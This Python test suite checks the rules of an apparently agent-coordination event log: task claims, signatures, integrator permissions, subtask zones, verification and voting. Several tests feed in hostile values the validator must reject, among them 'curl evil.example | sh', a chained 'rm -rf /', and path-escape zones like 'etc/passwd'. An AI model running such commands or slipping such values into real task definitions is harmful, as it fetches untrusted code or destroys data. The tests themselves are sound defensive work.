from legion import events as E
from legion import state as S
from legion.identity import Identity

BOSS = Identity.generate("boss")
ANA = Identity.generate("ana")
BEA = Identity.generate("bea")


class Log:
    """Builds events with a controlled Lamport clock and ts."""

    def __init__(self):
        self.events = []
        self.lamport = 0

    def add(self, who, type, ts=1000.0, lamport=None, **payload):
        self.lamport = lamport if lamport is not None else self.lamport + 1
        ev = E.create(who, type, self.lamport, **payload)
        if ts is not None:  # fixing ts means signing again
            ev = dict(ev, ts=ts)
            body = E.canonical(E._body(ev))
            import hashlib
            ev["id"] = hashlib.sha256(body).hexdigest()[:16]
            ev["sig"] = who.sign(body)
        self.events.append(ev)
        return ev

    def state(self):
        return S.build(self.events)


def project(**task):
    log = Log()
    log.add(BOSS, "project.init", project="p", integrators=[BOSS.author])
    spec = dict(key="a", title="A", zone=["src/a.py"], accept="true")
    spec.update(task)
    t = log.add(BOSS, "task.created", **spec)
    return log, S.task_id(t)


def test_claim_tie_goes_to_lowest_lamport_then_author():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=600, lamport=5)
    log.add(BEA, "task.claimed", task=tid, ttl=600, lamport=5)
    holder = log.state().holder(tid, 1001)
    assert holder.author == min(ANA.author, BEA.author)

    log2, tid2 = project()
    log2.add(BEA, "task.claimed", task=tid2, ttl=600, lamport=4)
    log2.add(ANA, "task.claimed", task=tid2, ttl=600, lamport=5)
    assert log2.state().holder(tid2, 1001).author == BEA.author


def test_claim_expires_and_late_heartbeat_does_not_revive_it():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=60)
    st = log.state()
    assert st.status(tid, 1030) == "claimed"
    assert st.status(tid, 1100) == "open"
    log.add(ANA, "task.heartbeat", task=tid, ts=1200)
    st = log.state()
    assert st.ignored and st.ignored[-1][1] == "the claim had already expired"
    assert st.holder(tid, 1201) is None


def test_heartbeat_extends_claim():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=60)
    log.add(ANA, "task.heartbeat", task=tid, ts=1050)
    assert log.state().holder(tid, 1100).author == ANA.author


def test_only_integrators_create_tasks_or_judge():
    log, tid = project()
    log.add(ANA, "task.created", key="b", title="B", zone=["x"], accept="true")
    p = log.add(ANA, "patch.submitted", task=tid, commit="c", branch="legion/t/b-1")
    log.add(ANA, "patch.accepted", patch=p["id"])
    st = log.state()
    assert len(st.tasks) == 1
    assert st.patches[p["id"]].verdict is None
    assert {why for _, why in st.ignored} == {"only an integrator can publish this event"}


def test_forged_events_are_ignored():
    log, tid = project()
    ev = log.add(ANA, "task.claimed", task=tid, ttl=600)
    ev["author"] = BEA.author  # impersonating someone else breaks the signature
    st = log.state()
    assert st.holder(tid, 1001) is None
    assert st.ignored[0][1] in ("the id does not match the content", "invalid signature")


def test_deps_block_until_accepted():
    log, a = project()
    b = S.task_id(log.add(BOSS, "task.created", key="b", title="B", zone=["b"], accept="true", deps=[a]))
    assert log.state().status(b, 1001) == "blocked"
    p = log.add(ANA, "patch.submitted", task=a, commit="c", branch="legion/t/x-1")
    log.add(BOSS, "patch.accepted", patch=p["id"])
    st = log.state()
    assert st.status(a, 1001) == "accepted"
    assert st.status(b, 1001) == "open"


def test_competitive_tracks_best_metric():
    log, tid = project(mode="competitive", metric="bench", goal="min")
    for value in (3.0, 1.5):
        p = log.add(ANA, "patch.submitted", task=tid, commit="c", branch="legion/t/x-1")
        log.add(BOSS, "patch.accepted", patch=p["id"], metric=value)
    st = log.state()
    assert st.best(tid) == 1.5
    assert st.status(tid, 1001) == "open"
    assert st.claimable(1001) == []


def test_order_of_arrival_does_not_matter():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    log.add(BEA, "task.claimed", task=tid, ttl=600)
    a = log.state()
    b = S.build(list(reversed(log.events)))
    assert a.holder(tid, 1001).author == b.holder(tid, 1001).author


def test_in_zone():
    assert S.in_zone("src/a.py", ["src/a.py"])
    assert S.in_zone("src/x/y.py", ["src/"])
    assert not S.in_zone("src/ab.py", ["src/a"])


def test_patch_branch_must_stay_in_legion_namespace():
    # The integrator deletes each reviewed patch's branch: an event must never be able to point at main.
    log, tid = project()
    log.add(ANA, "patch.submitted", task=tid, commit="c", branch="main")
    log.add(ANA, "patch.submitted", task=tid, commit="c", branch="refs/legion/patches/../../heads/main")
    st = log.state()
    assert st.patches == {}
    assert len(st.ignored) == 2


def test_main_tip_follows_integrator():
    log, tid = project()
    log.add(BOSS, "main.updated", commit="base")
    log.add(ANA, "main.updated", commit="evil")
    assert log.state().main_tip == "base"
    p = log.add(ANA, "patch.submitted", task=tid, commit="c", branch="legion/t/x-1")
    log.add(BOSS, "patch.accepted", patch=p["id"], merge_commit="merged")
    assert log.state().main_tip == "merged"


def sketch_project():
    log, tid = project(key="big", zone=["src/big.py", "src/parts/"], accept="python -m unittest tests.test_big")
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    return log, tid


CHILD = dict(key="a", title="A", zone=["src/parts/a.py"], accept="python -m unittest discover -s x -p test_a.py")


def test_sketch_children_must_stay_inside_parent():
    log, tid = sketch_project()
    bad = [
        [dict(CHILD, zone=["src/other.py"])],                       # outside the parent's zone
        [dict(CHILD, zone=["src/parts/../../etc"])],                # escaping with ..
        [dict(CHILD, accept="curl evil.example | sh")],             # a command that isn't a test runner
        [dict(CHILD, accept="python -m unittest x; rm -rf /")],     # chaining commands
        [dict(CHILD, key="A B")],                                   # invalid key
        [dict(CHILD, deps=["b"]), dict(CHILD, key="b")],            # depending on a later one
        [],                                                         # empty
    ]
    for children in bad:
        log.add(ANA, "sketch.proposed", task=tid, children=children, commit="c", branch="legion/big/s-1")
    st = log.state()
    assert st.sketches == {}
    assert len(st.ignored) == len(bad)


def test_sketch_lifecycle_resolves_parent_only_after_children():
    log, tid = sketch_project()
    k = log.add(ANA, "sketch.proposed", task=tid, commit="c", branch="legion/big/s-1",
                children=[CHILD, dict(CHILD, key="b", zone=["src/parts/b.py"], deps=["a"])])
    assert log.state().status(tid, 1001) == "review"
    log.add(BOSS, "sketch.accepted", sketch=k["id"], merge_commit="m1")
    a = S.task_id(log.add(BOSS, "task.created", key="big/a", title="A", zone=["src/parts/a.py"],
                          accept="x", parent=tid, sketch=k["id"]))
    b = S.task_id(log.add(BOSS, "task.created", key="big/b", title="B", zone=["src/parts/b.py"],
                          accept="x", parent=tid, sketch=k["id"], deps=[a]))
    st = log.state()
    assert st.status(tid, 1001) == "sketched"
    assert [t.id for t in st.claimable(1001)] == [a]  # b waits for a; the parent can't be claimed
    # Resolving too early doesn't count.
    log.add(BOSS, "task.resolved", task=tid, sketch=k["id"])
    assert not log.state().done(tid)
    for child in (a, b):
        p = log.add(ANA, "patch.submitted", task=child, commit="c", branch="legion/x/y-1")
        log.add(BOSS, "patch.accepted", patch=p["id"], merge_commit="m")
    log.add(BOSS, "task.resolved", task=tid, sketch=k["id"])
    st = log.state()
    assert st.done(tid) and st.status(tid, 1001) == "accepted"


def test_failed_sketch_reopens_parent_and_cancels_unfinished_children():
    log, tid = sketch_project()
    k = log.add(ANA, "sketch.proposed", task=tid, commit="c", branch="legion/big/s-1", children=[CHILD])
    log.add(BOSS, "sketch.accepted", sketch=k["id"])
    a = S.task_id(log.add(BOSS, "task.created", key="big/a", title="A", zone=["src/parts/a.py"],
                          accept="x", parent=tid, sketch=k["id"]))
    log.add(BOSS, "sketch.failed", sketch=k["id"], reason="el test de arriba sigue fallando")
    st = log.state()
    assert st.status(a, 1001) == "cancelled"
    assert st.status(tid, 1001) in ("open", "claimed")
    assert st.exclusive_done() is False


def test_only_integrator_creates_children():
    log, tid = sketch_project()
    k = log.add(ANA, "sketch.proposed", task=tid, commit="c", branch="legion/big/s-1", children=[CHILD])
    log.add(BOSS, "sketch.accepted", sketch=k["id"])
    log.add(ANA, "task.created", key="big/a", title="A", zone=["src/parts/a.py"], accept="x",
            parent=tid, sketch=k["id"])
    log.add(BOSS, "task.created", key="big/z", title="Z", zone=["src/other.py"], accept="x",
            parent=tid, sketch=k["id"])  # not even the integrator can move a subtask out of the zone
    assert log.state().children(tid) == []


def test_only_an_integrator_describes_the_project_and_the_latest_wins():
    log = Log()
    log.add(BOSS, "project.init", project="p", integrators=[BOSS.author], description="first")
    assert log.state().description == "first"
    log.add(ANA, "project.described", description="hijacked")
    log.add(BOSS, "project.described", description="second")
    log.add(BOSS, "project.described", description="x" * (E.MAX_DESCRIPTION + 1))
    st = log.state()
    assert st.description == "second"
    assert len(st.ignored) == 2


def stuck_project(**task):
    log, tid = sketch_project() if not task else project(**task)
    for i in range(S.STALL_AFTER):
        log.add(BEA, "attempt.reported", task=tid, outcome="failure", notes=f"tried {i}")
    return log, tid


def test_a_path_only_opens_on_a_stuck_task():
    log, tid = sketch_project()
    path = dict(children=[CHILD], notes="the direct approach keeps failing; build a helper first")
    log.add(BEA, "path.proposed", task=tid, **path)
    assert log.state().paths_for(tid) == []  # not stuck yet
    for i in range(S.STALL_AFTER):
        log.add(BEA, "attempt.reported", task=tid, outcome="failure", notes=f"tried {i}")
    st = log.state()
    assert st.stalled(tid)
    log.add(BEA, "path.proposed", task=tid, **path)
    assert len(log.state().paths_for(tid)) == 1


def test_a_path_adds_routes_without_taking_the_task_over():
    log, tid = stuck_project()
    k = log.add(BEA, "path.proposed", task=tid, children=[CHILD], notes="smaller case first")
    log.add(BOSS, "path.accepted", path=k["id"])
    child = S.task_id(log.add(BOSS, "task.created", key="big/a", title="A", zone=["src/parts/a.py"],
                              accept="x", parent=tid, path=k["id"]))
    st = log.state()
    assert st.tasks[child].parent == tid
    assert st.status(tid, 1001) == "claimed"  # ANA still holds it: a path doesn't block or replace the task
    assert not st.stalled(tid)  # an accepted path counts as progress
    p = log.add(BEA, "patch.submitted", task=child, commit="c", branch="legion/x/y-1")
    log.add(BOSS, "patch.accepted", patch=p["id"], merge_commit="m")
    log.add(BOSS, "task.resolved", task=tid, sketch=k["id"])  # a path never resolves its task
    assert not log.state().done(tid)


def test_paths_work_on_competitive_tasks_and_are_limited():
    log, tid = stuck_project(key="record", zone=["src/"], accept="true", mode="competitive", metric="python m.py")
    for i in range(S.MAX_OPEN_PATHS + 1):
        log.add(BEA, "path.proposed", task=tid, notes="another idea",
                children=[dict(CHILD, key=f"idea{i}", zone=[f"src/idea{i}.py"])])
    st = log.state()
    assert len(st.paths_for(tid)) == S.MAX_OPEN_PATHS
    assert "paths under way" in st.ignored[-1][1]


def test_a_path_needs_notes_and_the_usual_subtask_rules():
    log, tid = stuck_project()
    log.add(BEA, "path.proposed", task=tid, children=[CHILD], notes="")
    log.add(BEA, "path.proposed", task=tid, children=[dict(CHILD, zone=["etc/passwd"])], notes="x")
    log.add(BEA, "path.proposed", task=tid, children=[dict(CHILD, accept="curl x | sh")], notes="x")
    assert log.state().paths_for(tid) == []


def test_a_project_can_allow_its_own_verifier_in_subtasks():
    log = Log()
    log.add(BOSS, "project.init", project="p", integrators=[BOSS.author],
            runners=S.DEFAULT_RUNNERS + ["python check.py"])
    t = S.task_id(log.add(BOSS, "task.created", key="big", title="Big", zone=["Lean/"], accept="python check.py big"))
    log.add(ANA, "task.claimed", task=t, ttl=600)
    child = dict(key="lemma", title="A lemma", zone=["Lean/Lemma.lean"], accept="python check.py --module Lean.Lemma")
    log.add(ANA, "sketch.proposed", task=t, children=[dict(child, accept="python evil.py")], commit="c",
            branch="legion/big/s-1")
    log.add(ANA, "sketch.proposed", task=t, children=[child], commit="c", branch="legion/big/s-2")
    st = log.state()
    assert len(st.sketches_for(t)) == 1
    assert "must start with one of" in st.ignored[0][1]


CEL, DAN = Identity.generate("cel"), Identity.generate("dan")


def test_idle_agents_join_the_hardest_task_up_to_a_limit():
    log, easy = project(size="S")
    hard = S.task_id(log.add(BOSS, "task.created", key="h", title="H", zone=["h"], accept="true", size="L"))
    log.add(ANA, "task.claimed", task=easy, ttl=600)
    log.add(BEA, "task.claimed", task=hard, ttl=600)
    st = log.state()
    assert [t.id for t in st.joinable(CEL.author, 1001)] == [hard, easy]  # the biggest first
    log.add(CEL, "task.claimed", task=hard, ttl=600, join=True)
    log.add(DAN, "task.claimed", task=hard, ttl=600, join=True)
    log.add(BOSS, "task.claimed", task=hard, ttl=600, join=True)  # a fourth: no room
    st = log.state()
    assert [c.author for c in st.claimants(hard, 1001)] == [BEA.author, CEL.author, DAN.author]
    assert st.works_on(hard, CEL.author, 1001) and not st.works_on(hard, BOSS.author, 1001)
    assert hard not in [t.id for t in st.joinable(BOSS.author, 1001)]
    assert [t.id for t in st.held_by(CEL.author, 1001)] == [hard]


def test_a_claim_that_doesnt_join_still_loses_the_race():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    log.add(BEA, "task.claimed", task=tid, ttl=600)
    assert [c.author for c in log.state().claimants(tid, 1001)] == [ANA.author]


def test_a_blocked_task_can_be_prepared_and_its_patch_waits():
    log, a = project()
    b = S.task_id(log.add(BOSS, "task.created", key="b", title="B", zone=["b"], accept="true", deps=[a]))
    assert [t.id for t in log.state().preparable(1001)] == [b]
    log.add(ANA, "task.claimed", task=b, ttl=600)
    p = log.add(ANA, "patch.submitted", task=b, commit="c", branch="legion/t/b-1")
    st = log.state()
    assert st.status(b, 1001) == "blocked" and st.preparable(1001) == []
    assert st.held_by(ANA.author, 1001) == []  # its patch waits: ANA moves on
    q = log.add(BEA, "patch.submitted", task=a, commit="c", branch="legion/t/a-1")
    log.add(BOSS, "patch.accepted", patch=q["id"])
    assert log.state().status(b, 1001) == "review" and log.state().patches[p["id"]].verdict is None


def test_agents_on_a_task_talk_through_notes():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    log.add(BEA, "task.claimed", task=tid, ttl=600, join=True)
    log.add(ANA, "task.note", task=tid, text="I'm trying induction on m")
    log.add(BEA, "task.note", task=tid, text="then I take the counting route")
    log.add(CEL, "task.note", task=tid, text="spam")  # not working on it
    log.add(ANA, "task.note", task=tid, text="")
    st = log.state()
    assert [n["text"] for n in st.notes[tid]] == ["I'm trying induction on m", "then I take the counting route"]
    assert [why for _, why in st.ignored] == ["only someone who works on the task, or has, may post notes on it",
                                              f"a note is text of at most {E.MAX_NOTES} characters"]


def test_notes_per_agent_are_limited():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    for i in range(S.MAX_TASK_NOTES + 2):
        log.add(ANA, "task.note", task=tid, text=f"note {i}")
    assert len(log.state().notes[tid]) == S.MAX_TASK_NOTES


def test_unblocks_counts_dependents_and_parents_up_the_chain():
    log, tid = sketch_project()
    k = log.add(ANA, "sketch.proposed", task=tid, commit="c", branch="legion/big/s-1",
                children=[CHILD, dict(CHILD, key="b", zone=["src/parts/b.py"])])
    log.add(BOSS, "sketch.accepted", sketch=k["id"], merge_commit="m1")
    a = S.task_id(log.add(BOSS, "task.created", key="big/a", title="A", zone=["src/parts/a.py"],
                          accept="x", parent=tid, sketch=k["id"]))
    b = S.task_id(log.add(BOSS, "task.created", key="big/b", title="B", zone=["src/parts/b.py"],
                          accept="x", parent=tid, sketch=k["id"]))
    later = S.task_id(log.add(BOSS, "task.created", key="later", title="L", zone=["l"], accept="x", deps=[tid]))
    last = S.task_id(log.add(BOSS, "task.created", key="last", title="Z", zone=["z"], accept="x", deps=[later]))
    lone = S.task_id(log.add(BOSS, "task.created", key="lone", title="O", zone=["o"], accept="x"))
    st = log.state()
    assert st.unblocks(a) == 3  # its parent, the task waiting for the parent, and the one after that
    assert st.unblocks(b) == 3 and st.unblocks(later) == 1 and st.unblocks(lone) == 0 and st.unblocks(last) == 0


def test_an_agent_whose_patch_waits_is_free_for_other_work():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    assert [t.id for t in log.state().held_by(ANA.author, 1001)] == [tid]
    log.add(ANA, "patch.submitted", task=tid, commit="c", branch="legion/t/a-1")
    assert log.state().held_by(ANA.author, 1001) == []


def test_attempts_since_the_task_last_advanced():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    log.add(ANA, "attempt.reported", task=tid, outcome="failure", notes="no")
    log.add(ANA, "task.released", task=tid)
    st = log.state()
    assert st.attempts_by(tid, ANA.author) == 2 and st.attempts_by(tid, BEA.author) == 0


def test_competitive_tasks_are_handed_out_until_three_attempts():
    log, fresh = project(key="c1", mode="competitive", metric="m", goal="min")
    done = S.task_id(log.add(BOSS, "task.created", key="c2", title="C2", zone=["c2"], accept="true",
                             mode="competitive", metric="m", goal="min"))
    p = log.add(BEA, "patch.submitted", task=done, commit="c", branch="legion/c2/b-1")
    log.add(BOSS, "patch.accepted", patch=p["id"], metric=5.0)
    assert [t.id for t in log.state().competitive_for(ANA.author)] == [fresh, done]  # no result yet first
    for _ in range(S.COMPETITIVE_TRIES):
        log.add(ANA, "attempt.reported", task=fresh, outcome="failure", notes="no gain")
    assert [t.id for t in log.state().competitive_for(ANA.author)] == [done]
    q = log.add(ANA, "patch.submitted", task=done, commit="c", branch="legion/c2/a-1")
    assert log.state().competitive_for(ANA.author) == []  # its patch waits for the verdict
    log.add(BOSS, "patch.accepted", patch=q["id"], metric=4.0)  # it improved: the count starts again
    assert [t.id for t in log.state().competitive_for(ANA.author)] == [done]


def test_a_blocked_task_someone_prepares_can_be_joined():
    log, a = project()
    b = S.task_id(log.add(BOSS, "task.created", key="b", title="B", zone=["b"], accept="true", deps=[a]))
    log.add(ANA, "task.claimed", task=b, ttl=600)
    assert [t.id for t in log.state().joinable(BEA.author, 1001)] == [b]


TREE_A, TREE_B = "a" * 40, "b" * 40


def test_verifications_follow_their_rules():
    log, tid = project()
    p = log.add(ANA, "patch.submitted", task=tid, commit="c", branch="legion/t/a-1")
    ok = dict(task=tid, patch=p["id"], base_tree=TREE_A, tree=TREE_B, outcome="pass")
    log.add(BEA, "patch.verified", **ok)
    log.add(BEA, "patch.verified", **ok)                       # twice on the same tree
    log.add(ANA, "patch.verified", **ok)                       # its own patch
    log.add(CEL, "patch.verified", **dict(ok, outcome="maybe"))
    log.add(CEL, "patch.verified", **dict(ok, tree="not-a-tree"))
    log.add(BOSS, "project.policy", quorum=3, spot_check=0.5)
    log.add(BOSS, "project.policy", quorum=99)
    log.add(ANA, "project.policy", quorum=0)
    st = log.state()
    assert [v["author"] for v in st.verifications[p["id"]]] == [BEA.author]
    assert st.policy == dict(S.POLICY, quorum=3, spot_check=0.5)
    assert [why for _, why in st.ignored] == [
        "already verified on that tree", "a patch can't be verified by its own author", "outcome must be pass or fail",
        "base_tree and tree must be git tree ids", "quorum must be between 0 and 9",
        "only an integrator can publish this event"]


def test_a_subtree_lease_takes_its_tasks_from_the_project_lease():
    log, tid = project()
    other = S.task_id(log.add(BOSS, "task.created", key="o", title="O", zone=["o"], accept="true"))
    log.add(BOSS, "integrator.vote", action="add", key=ANA.author)
    log.add(BOSS, "integrator.lease", ttl=300)
    log.add(ANA, "integrator.lease", ttl=300, shard=tid)
    st = log.state()
    assert st.integrates(ANA.author, tid, 1001) and not st.integrates(BOSS.author, tid, 1001)
    assert st.integrates(BOSS.author, other, 1001) and not st.integrates(ANA.author, other, 1001)
    log.add(ANA, "integrator.release", project_lease=True)  # it held no project lease: its subtree stays
    assert log.state().integrates(ANA.author, tid, 1001)
    log.add(ANA, "integrator.release", shard=tid)
    assert log.state().integrates(BOSS.author, tid, 1001)


def test_who_took_part_may_talk_reply_and_mention():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    log.add(ANA, "attempt.reported", task=tid, outcome="failure", notes="induction loses a factor n")
    log.add(ANA, "task.released", task=tid)                      # ANA left the task, but took part in it
    q = log.add(ANA, "task.note", task=tid, text="@bea did the counting route close it?")
    log.add(BEA, "task.claimed", task=tid, ttl=600)
    st = log.state()
    assert [n["text"] for n in st.notes[tid]] == ["@bea did the counting route close it?"]
    assert [n["id"] for n in st.mentions("bea")] == [q["id"]]     # waiting for BEA's answer
    assert [n["id"] for n in st.mentions("bea#2")] == [q["id"]]   # @bea reaches all of bea's agents
    log.add(BEA, "task.note", task=tid, text="Not yet: it gives m >= 17.", reply=q["id"])
    log.add(BEA, "task.note", task=tid, text="x", reply="nope")
    st = log.state()
    assert st.mentions("bea") == [] and st.notes[tid][-1]["reply"] == q["id"]
    assert st.ignored[-1][1] == "a reply answers a note on the same task"


def test_a_task_opens_while_its_dependencies_are_in_review():
    log, a = project()
    b = S.task_id(log.add(BOSS, "task.created", key="b", title="B", zone=["b"], accept="true", deps=[a]))
    assert log.state().status(b, 1001) == "blocked"            # a has nothing in review yet
    pa = log.add(ANA, "patch.submitted", task=a, commit="c", branch="legion/t/a-1")
    st = log.state()
    assert st.status(b, 1001) == "open" and b in [t.id for t in st.claimable(1001)]
    assert st.review_patch(a).id == pa["id"]
    log.add(BEA, "task.claimed", task=b, ttl=600)
    log.add(BEA, "patch.submitted", task=b, commit="d", branch="legion/t/b-1")
    assert log.state().status(b, 1001) == "blocked"            # b's own patch waits for a's verdict
    log.add(BOSS, "patch.rejected", patch=pa["id"], reason="tests fail", code="tests")
    assert log.state().status(b, 1001) == "blocked"            # a's patch is gone: b waits for a again


DAN = Identity.generate("dan")


def open_project():
    """An open-mode project where ANA and BEA are trusted (two accepted patches each) and CEL isn't."""
    log, tid = project()
    log.add(BOSS, "project.policy", mode="open", quorum=1)
    for who in (ANA, BEA):
        for i in range(2):
            t = S.task_id(log.add(BOSS, "task.created", key=f"w-{who.name}-{i}", title="w", zone=["w"], accept="true"))
            p = log.add(who, "patch.submitted", task=t, commit="c", branch=f"legion/w/{who.name}-{i}")
            log.add(BOSS, "patch.accepted", patch=p["id"], merge_commit=f"m-{who.name}-{i}")
    return log, tid


def test_in_the_open_mode_a_trusted_node_accepts_on_another_owners_pass():
    log, tid = open_project()
    st = log.state()
    assert st.trusted(ANA.author) and st.trusted(BEA.author) and not st.trusted(CEL.author)
    p = log.add(CEL, "patch.submitted", task=tid, commit="c", branch="legion/t/c-1")
    log.add(ANA, "patch.accepted", patch=p["id"], merge_commit="m1")            # no verification behind it
    v = log.add(BEA, "patch.verified", task=tid, patch=p["id"], base_tree=TREE_A, tree=TREE_B, outcome="pass")
    log.add(DAN, "patch.accepted", patch=p["id"], merge_commit="m1", verified_by=[v["id"]])  # DAN isn't trusted
    log.add(ANA, "patch.accepted", patch=p["id"], merge_commit="m1", verified_by=[v["id"]], tree=TREE_B,
            base=log.state().main_tip)
    st = log.state()
    assert st.patches[p["id"]].verdict == "accepted" and st.main_tip == "m1"
    assert [why for _, why in st.ignored] == ["verified_by must list this patch's verifications",
                                              "only an integrator can publish this event"]


def test_a_challenge_by_two_trusted_owners_reverts_inside_the_window():
    log, tid = open_project()
    log.add(BOSS, "project.policy", quorum=1)
    p = log.add(CEL, "patch.submitted", task=tid, commit="c", branch="legion/t/c-1")
    v = log.add(BEA, "patch.verified", task=tid, patch=p["id"], base_tree=TREE_A, tree=TREE_B, outcome="pass")
    log.add(ANA, "patch.accepted", patch=p["id"], merge_commit="m1", verified_by=[v["id"]], tree=TREE_B,
            base=log.state().main_tip)
    fails = [log.add(who, "patch.verified", task=tid, patch=p["id"], base_tree=TREE_A, tree=TREE_B, outcome="fail")
             for who in (ANA, BOSS)]
    log.add(ANA, "patch.reverted", patch=p["id"], merge_commit="r1", verified_by=[f["id"] for f in fails], base="m1")
    st = log.state()
    assert st.patches[p["id"]].verdict == "reverted" and st.main_tip == "r1" and not st.done(tid)
    assert BEA.author in st.falsified and CEL.author in st.falsified and not st.trusted(BEA.author)
    late = log.add(ANA, "patch.verified", task=tid, patch=p["id"], base_tree=TREE_A, tree=TREE_B, outcome="fail",
                   ts=1000.0 + 2 * 86400)
    assert log.state().ignored[-1][0]["id"] == late["id"]  # past the window: no more audits


def trusted_crowd(n):
    """An open-mode project with n trusted agents (two accepted patches each), all active."""
    log, tid = project()
    log.add(BOSS, "project.policy", mode="open", quorum=1)
    crowd = [Identity.generate(f"agent{i}") for i in range(n)]
    for who in crowd:
        for j in range(2):
            t = S.task_id(log.add(BOSS, "task.created", key=f"w-{who.name}-{j}", title="w", zone=["w"], accept="true"))
            p = log.add(who, "patch.submitted", task=t, commit="c", branch=f"legion/w/{who.name}-{j}")
            log.add(BOSS, "patch.accepted", patch=p["id"], merge_commit=f"m-{who.name}-{j}")
    return log, crowd


def test_a_task_passes_by_a_majority_of_trusted_owners():
    log, crowd = trusted_crowd(4)  # 5 active trusted owners with BOSS: a majority is 3
    spec = dict(key="new", title="A new route", zone=["n"], accept="true")
    prop = log.add(crowd[0], "proposal.made", kind="task.created", payload=spec)
    log.add(crowd[1], "proposal.voted", proposal=prop["id"], yes=True)
    st = log.state()
    assert st.proposals[prop["id"]]["status"] == "open" and not st.find_task("new")
    log.add(CEL, "proposal.voted", proposal=prop["id"], yes=True)  # not trusted: doesn't count
    log.add(crowd[2], "proposal.voted", proposal=prop["id"], yes=True)
    st = log.state()
    assert st.proposals[prop["id"]]["status"] == "passed"
    assert st.find_task("new").id == S.task_id(prop)                # the same id on every node
    assert st.ignored[-1][1] == "only a trusted agent may propose or vote"


def test_a_proposed_task_carries_its_contract_and_waits_for_its_dependencies():
    log, crowd = trusted_crowd(4)  # a majority is 3
    test = "import unittest\n"
    base = dict(title="t", accept="python -m unittest discover -s legion_contracts/tail -p test_tail.py")
    tail = log.add(crowd[0], "proposal.made", kind="task.created",
                   payload=dict(base, key="tail", zone=["src/Tail.lean"], contract={"test_tail.py": test}))
    master = log.add(crowd[0], "proposal.made", kind="task.created",  # depends on a task not created yet
                     payload=dict(base, key="master", zone=["src/Master.lean"], deps=["tail"]))
    for p in (master, tail):  # master gets its votes first: it waits for tail
        for who in crowd[1:3]:
            log.add(who, "proposal.voted", proposal=p["id"], yes=True)
        if p is master:
            st = log.state()
            assert st.proposals[master["id"]]["status"] == "open" and not st.find_task("master")
            assert st.proposals[master["id"]]["reason"] == "waiting for tail to pass"
    st = log.state()
    assert st.find_task("tail").contract == {"test_tail.py": test}
    assert st.proposals[master["id"]]["status"] == "passed"
    assert st.find_task("master").deps == [st.find_task("tail").id]
    bad = [dict(base, key="a", zone=["legion_contracts/"], contract={"t.py": test}),  # its zone holds the contract
           dict(base, key="b", zone=["b"], contract={"../t.py": test}),                # a folder in the name
           dict(base, key="c", zone=["c"], deps=["nowhere"])]                          # no such task or proposal
    for payload in bad:
        log.add(crowd[0], "proposal.made", kind="task.created", payload=payload)
    assert [err for _, err in log.state().ignored[-3:]] == [
        "the zone can't include the contract's folder (legion_contracts/a)",
        "contract files have plain names (no folders) and text",
        "a dependency is a task, or the key of a task another open proposal creates"]


def test_saved_work_is_kept_per_author_for_whoever_takes_the_task_next():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    first = log.add(ANA, "work.saved", task=tid, commit="c1", branch=f"refs/legion/patches/{tid}/wip-ana-1", notes="stage 1")
    log.add(ANA, "work.saved", task=tid, commit="c2", branch=f"refs/legion/patches/{tid}/wip-ana-2", notes="stage 2")
    log.add(BEA, "work.saved", task=tid, commit="c3", branch=f"refs/legion/patches/{tid}/wip-bea-1")  # never on it
    log.add(ANA, "work.saved", task=tid, commit="c4", branch="refs/heads/main")                        # not a patch ref
    st = log.state()
    assert [(w["name"], w["commit"], w["notes"]) for w in st.saves(tid)] == [("ana", "c2", "stage 2")]
    assert [w["id"] for w in st.saved[tid]][0] == first["id"]
    assert [err for _, err in st.ignored[-2:]] == [
        "only someone who works on the task, or has, may save work on it",
        "missing commit, or the branch is outside the patch namespace"]


def test_the_policy_needs_two_thirds_and_a_founder_can_veto_early():
    log, crowd = trusted_crowd(5)  # 6 active owners: two thirds is 4
    prop = log.add(crowd[0], "proposal.made", kind="project.policy", payload={"window": 7200})
    for who in crowd[1:3]:
        log.add(who, "proposal.voted", proposal=prop["id"], yes=True)
    assert log.state().policy["window"] == 86400                     # 3 of 6: not yet
    log.add(crowd[3], "proposal.voted", proposal=prop["id"], yes=True)
    assert log.state().policy["window"] == 7200
    early = log.add(crowd[0], "proposal.made", kind="project.described", payload={"description": "hijack"})
    log.add(BOSS, "proposal.voted", proposal=early["id"], yes=False)  # 5 trusted owners besides the founder: no veto
    st = log.state()
    assert st.proposals[early["id"]]["status"] == "open"             # FOUNDERS_UNTIL reached: no veto any more
    small, few = trusted_crowd(2)
    p2 = small.add(few[0], "proposal.made", kind="project.described", payload={"description": "x"})
    small.add(BOSS, "proposal.voted", proposal=p2["id"], yes=False)
    assert small.state().proposals[p2["id"]]["status"] == "vetoed"
